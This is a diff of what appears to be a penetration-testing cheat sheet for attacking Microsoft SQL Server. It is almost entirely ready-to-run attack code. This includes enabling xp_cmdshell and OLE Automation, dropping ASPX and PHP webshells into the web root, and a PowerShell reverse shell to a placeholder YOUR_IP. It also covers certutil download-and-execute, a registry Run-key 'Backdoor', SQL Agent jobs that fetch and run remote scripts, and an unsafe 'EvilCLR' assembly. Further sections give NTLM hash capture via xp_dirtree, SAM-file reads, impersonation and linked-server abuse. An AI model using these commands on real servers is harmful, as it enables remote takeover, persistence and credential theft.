@@ -72,138 +72,168 @@ nmap -p 1433 --script ms-sql-config <target> --script-args mssqlusername='sa',ms
 ### MSSQL Exploitation Commands
 
 ```bash
-### Account Check
+-- Service accounts
 SELECT servicename, service_account FROM sys.dm_server_services;
 
-Get-CimInstance Win32_Service | 
-Where-Object {$_.Name -like "MSSQL*"} | 
-Select Name, StartName
+-- Current context
+SELECT SYSTEM_USER, USER_NAME(), IS_SRVROLEMEMBER('sysadmin'), @@version;
 
-### xp_cmdshell
-EXEC sp_configure 'show advanced options', 1;
-RECONFIGURE; ( Enabled )
+-- Sysadmin check
+SELECT IS_SRVROLEMEMBER('sysadmin');
 
-EXEC sp_configure 'xp_cmdshell', 1;
-RECONFIGURE; ( Enabled )
+-- Logins & roles
+SELECT name FROM sys.sql_logins;
+SELECT name FROM sys.database_principals;
+SELECT name FROM sys.server_principals;
 
+-- Databases
+SELECT name FROM sys.databases;
+USE <dbname>;
+SELECT name FROM sys.tables;
+
+-- Roles & permissions
+SELECT * FROM sys.database_role_members;
+SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';
+
+-- Trustworthy DBs
+SELECT name, is_trustworthy_on FROM sys.databases;
+
+-- Linked servers
+SELECT srvname, isremote FROM sysservers;
+
+=========== xp_cmdshell ===========
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
 EXEC xp_cmdshell 'whoami';
+EXEC xp_cmdshell 'net user';
+EXEC xp_readerrorlog;
+EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;
 
-EXEC sp_configure 'xp_cmdshell', 0;
-RECONFIGURE; ( Disabled )
+=========== OLE Automation ===========
+Enable
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;
+EXEC sp_configure 'Ole Automation Procedures'; -- Verify
 
-EXEC xp_readerrorlog; ( Loglar )
-
-### OLE Automation
-EXEC sp_configure 'show advanced options', 1;
-RECONFIGURE;
-
-EXEC sp_configure 'Ole Automation Procedures', 1;
-RECONFIGURE;
-
-EXEC sp_configure 'Ole Automation Procedures';
-
-================ Basic File Operations (sp_OACreate) ================
+ASPX Webshell
 DECLARE @obj INT, @fso INT, @file INT, @hr INT
 EXEC @hr = sp_OACreate 'Scripting.FileSystemObject', @obj OUT
 EXEC @hr = sp_OAMethod @obj, 'CreateTextFile', @file OUT, 'C:\inetpub\wwwroot\shell.aspx', 2
 EXEC @hr = sp_OAMethod @file, 'Write', NULL, '<%@ Page Language="C#" %><% Process proc = new Process(); proc.StartInfo.FileName = Request["cmd"]; proc.StartInfo.Arguments = "/c " + Request["c"]; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; proc.Start(); Response.Write("<pre>" + proc.StandardOutput.ReadToEnd() + "</pre>"); proc.WaitForExit(); %>'
-EXEC @hr = sp_OAMethod @file, 'Close'
-EXEC sp_OADestroy @file
-EXEC sp_OADestroy @obj
+EXEC @hr = sp_OAMethod @file, 'Close'; EXEC sp_OADestroy @file; EXEC sp_OADestroy @obj
 
-================ Powershell ReverseShell ================
-DECLARE @obj INT, @com INT, @file INT, @hr INT, @src NVARCHAR(1000)
-SET @src = N'
-$client = new-object System.Net.Sockets.TCPClient("YOUR_IP",4444);
-$stream = $client.GetStream();
-[byte[]]$bytes = 0..65535|%{0};
-while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
-    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
-    $sendback = (iex $data 2>&1 | Out-String );
-    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
-    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
-    $stream.Write($sendbyte,0,$sendbyte.Length);
-    $stream.Flush()
-}
-$client.Close()'
-EXEC @hr = sp_OACreate 'Scripting.FileSystemObject', @obj OUT
-EXEC @hr = sp_OAMethod @obj, 'CreateTextFile', @file OUT, 'C:\Windows\Temp\rev.ps1', 2
-EXEC @hr = sp_OAMethod @file, 'Write', NULL, @src
-EXEC @hr = sp_OAMethod @file, 'Close'
-EXEC @hr = sp_OACreate 'WScript.Shell', @com OUT
-EXEC @hr = sp_OAMethod @com, 'Run', NULL, 'powershell.exe -ep bypass -f C:\Windows\Temp\rev.ps1'
-EXEC sp_OADestroy @com
-
-================ Download & Execute Payload ================
-DECLARE @obj INT, @com INT, @hr INT
-EXEC @hr = sp_OACreate 'WScript.Shell', @com OUT
-EXEC @hr = sp_OAMethod @com, 'Run', NULL, 
-    'certutil.exe -urlcache -split -f http://YOUR_IP/payload.exe C:\Windows\Temp\payload.exe && C:\Windows\Temp\payload.exe'
-EXEC sp_OADestroy @com
-
-================ PHP Webshell (Windows PHP) ================
+PHP Webshell
 DECLARE @obj INT, @fso INT, @file INT, @hr INT
 EXEC @hr = sp_OACreate 'Scripting.FileSystemObject', @obj OUT
 EXEC @hr = sp_OAMethod @obj, 'CreateTextFile', @file OUT, 'C:\inetpub\wwwroot\cmd.php', 2
 EXEC @hr = sp_OAMethod @file, 'Write', NULL, '<?php echo shell_exec($_GET["c"]); ?>'
-EXEC @hr = sp_OAMethod @file, 'Close'
-EXEC sp_OADestroy @file
-EXEC sp_OADestroy @obj
+EXEC @hr = sp_OAMethod @file, 'Close'; EXEC sp_OADestroy @file; EXEC sp_OADestroy @obj
 
-================ Advanced: WMI EXEC ================
-DECLARE @obj INT, @hr INT
+PowerShell Reverse Shell (to disk)
+DECLARE @obj INT, @com INT, @file INT, @hr INT, @src NVARCHAR(1000)
+SET @src = N'$client = new-object System.Net.Sockets.TCPClient("YOUR_IP",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> ''; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+EXEC @hr = sp_OACreate 'Scripting.FileSystemObject', @obj OUT
+EXEC @hr = sp_OAMethod @obj, 'CreateTextFile', @file OUT, 'C:\Windows\Temp\rev.ps1', 2
+EXEC @hr = sp_OAMethod @file, 'Write', NULL, @src; EXEC @hr = sp_OAMethod @file, 'Close'
+EXEC @hr = sp_OACreate 'WScript.Shell', @com OUT
+EXEC @hr = sp_OAMethod @com, 'Run', NULL, 'powershell.exe -ep bypass -f C:\Windows\Temp\rev.ps1'
+EXEC sp_OADestroy @com
 
-EXEC @hr = sp_OACreate 'WbemScripting.SWbemLocator', @obj OUT
-EXEC @hr = sp_OAMethod @obj, 'ConnectServer', @output OUT, '.', 'root\cimv2'
-EXEC @hr = sp_OAMethod @output, 'ExecQuery', @output OUT, 
-    'SELECT * FROM Win32_Process WHERE name=''cmd.exe'''
-EXEC sp_OADestroy @obj
+Download & Execute
+DECLARE @obj INT, @com INT, @hr INT
+EXEC @hr = sp_OACreate 'WScript.Shell', @com OUT
+EXEC @hr = sp_OAMethod @com, 'Run', NULL, 'certutil.exe -urlcache -split -f http://YOUR_IP/payload.exe C:\Windows\Temp\payload.exe && C:\Windows\Temp\payload.exe'
+EXEC sp_OADestroy @com
 
-================ Registry Persistence ================
+Registry Persistence
 DECLARE @obj INT, @hr INT
 EXEC @hr = sp_OACreate 'WScript.Shell', @obj OUT
-EXEC @hr = sp_OAMethod @obj, 'RegWrite', NULL, 
-    'HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Backdoor', 
-    'powershell -c "IEX (New-Object Net.WebClient).DownloadString(''http://YOUR_IP/backdoor.ps1'')"'
+EXEC @hr = sp_OAMethod @obj, 'RegWrite', NULL, 'HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Backdoor', 'powershell -c "IEX (New-Object Net.WebClient).DownloadString(''http://YOUR_IP/backdoor.ps1'')"'
 EXEC sp_OADestroy @obj
 
+WMI Exec
+DECLARE @obj INT, @hr INT
+EXEC @hr = sp_OACreate 'WbemScripting.SWbemLocator', @obj OUT
+EXEC @hr = sp_OAMethod @obj, 'ConnectServer', @output OUT, '.', 'root\cimv2'
+EXEC @hr = sp_OAMethod @output, 'ExecQuery', @output OUT, 'SELECT * FROM Win32_Process WHERE name=''cmd.exe'''
+EXEC sp_OADestroy @obj
 
+=========== SQL AGENT JOB RCE ===========
+PowerShell Job (Diskless)
+EXEC msdb.dbo.sp_add_job @job_name = N'hacker', @enabled = 1;
+EXEC msdb.dbo.sp_add_jobstep @job_name = N'hacker', @step_name = N'ps1', @subsystem = N'PowerShell', @command = N'IEX (New-Object Net.WebClient).DownloadString("http://YOUR_IP/shell.ps1")';
+EXEC msdb.dbo.sp_start_job N'hacker';
+EXEC msdb.dbo.sp_delete_job @job_name = N'hacker';
 
-SELECT name FROM sys.databases;
-USE dbname;
-SELECT name FROM sys.tables;
-SELECT * FROM table;
+CMD Job (xp_cmdshell olmadan)
+EXEC msdb.dbo.sp_add_jobstep @job_name = N'hacker', @step_name = N'cmd', @subsystem = N'CMDEXEC', @command = N'powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(''http://YOUR_IP/shell.ps1'')"';
 
-SELECT name FROM sys.sql_logins;
-SELECT name FROM sys.database_principals;
-SELECT IS_SRVROLEMEMBER('sysadmin');
-SELECT * FROM sys.server_principals;
+Enum Agent
+SELECT name, is_enabled, current_mode FROM msdb.dbo.sysjobservers;
+SELECT name, enabled FROM msdb.dbo.sysjobs;
 
-# Run as Sysadmin
+=========== CLR Assemblies RCE (xp_cmdshell bloklandıqda SILENT) ===========
+-- Enable CLR (unsafe)
+ALTER DATABASE [database_name] SET TRUSTWORTHY ON;
+EXEC sp_configure 'clr enabled', 1; RECONFIGURE;
+
+EXEC sp_configure 'clr strict security', 0; RECONFIGURE;
+
+-- Create RCE DLL (powershell.exe çağırır)
+-- Önce DLL-i yaradın və serverə upload edin: EvilCLR.dll
+
+CREATE ASSEMBLY EvilCLR FROM 'C:\temp\EvilCLR.dll' WITH PERMISSION_SET = UNSAFE;
+CREATE FUNCTION dbo.ExecCmd(@cmd NVARCHAR(4000)) RETURNS INT AS EXTERNAL NAME EvilCLR.StoredProcedures.ExecCmd;
+SELECT dbo.ExecCmd('powershell IEX(New-Object Net.WebClient).DownloadString("http://IP/shell.ps1")');
+
+-- Cleanup
+DROP FUNCTION dbo.ExecCmd; DROP ASSEMBLY EvilCLR;
+
+=========== Credential Harvesting (NTLM Hash Dump - Responder) ===========
+-- xp_dirtree SMB hash trigger
+EXEC xp_dirtree '\\YOUR_IP\share', 1, 1;
+
+-- xp_fileexist (alternativ)
+EXEC xp_fileexist '\\YOUR_IP\share\test.txt';
+
+-- Multi-trigger
+DECLARE @i INT = 0; WHILE @i < 10 BEGIN EXEC xp_dirtree '\\YOUR_IP\share',1,1; SET @i = @i + 1; END;
+
+-- Responder listener: responder -I eth0 -v
+
+=========== PRIVILEGE ESCALATION ===========
+-- Impersonation
+SELECT distinct b.name FROM sys.server_permissions a JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE permission_name = 'IMPERSONATE';
+
+-- Run as sysadmin
 EXECUTE AS LOGIN = 'sa'
-SELECT SYSTEM_USER
-SELECT IS_SRVROLEMEMBER('sysadmin')
+SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin')
+REVERT;
 
-SELECT SYSTEM_USER;
-SELECT USER_NAME();
-SELECT IS_SRVROLEMEMBER('sysadmin');
-
-SELECT * FROM sys.database_role_members;
+-- Help
 EXEC sp_helpuser;
 
-# IMPERSONATE Permission
-1. SELECT distinct b.name FROM sys.server_permissions a JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE permission_name = 'IMPERSONATE';
-2. SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';
+=========== FILE READ ===========
+-- Local files
+SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
 
-# Read Local Files
-1. SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
+SELECT * FROM OPENROWSET(BULK N'C:\Windows\System32\config\SAM', SINGLE_BLOB) AS x;
+SELECT * FROM OPENROWSET(BULK N'C:\inetpub\wwwroot\web.config', SINGLE_CLOB) AS x;
 
-SELECT name, is_trustworthy_on
-FROM sys.databases;
-
-SELECT srvname, isremote FROM sysservers
-
+=========== LINKED SERVER ABUSE ===========
 EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
+
+=========== MSSQLCLIENT.PY ONE-LINERS ===========
+# SQL Agent RCE
+python3 mssqlclient.py sa:pass@target -query "EXEC msdb.dbo.sp_add_job @job_name=N'h',@enabled=1;EXEC msdb.dbo.sp_add_jobstep @job_name=N'h',@step_name=N'x',@subsystem=N'PowerShell',@command=N'IEX(New-Object Net.WebClient).DownloadString(\"http://IP/shell.ps1\");EXEC msdb.dbo.sp_start_job N'h'"
+
+# OLE Webshell
+python3 mssqlclient.py sa:pass@target -query "EXEC sp_configure 'Ole Automation Procedures',1;RECONFIGURE;DECLARE @obj INT;EXEC sp_OACreate 'Scripting.FileSystemObject',@obj OUT;EXEC sp_OAMethod @obj,'CreateTextFile',NULL,'C:\\inetpub\\wwwroot\\shell.aspx',2;EXEC sp_OADestroy @obj"
+
+=========== LISTENERS ===========
+nc -lvnp 4444
+python3 -m http.server 80
+curl "http://target/shell.aspx?cmd=whoami&c=dir"
 ```
 
 ## PostgreSQL
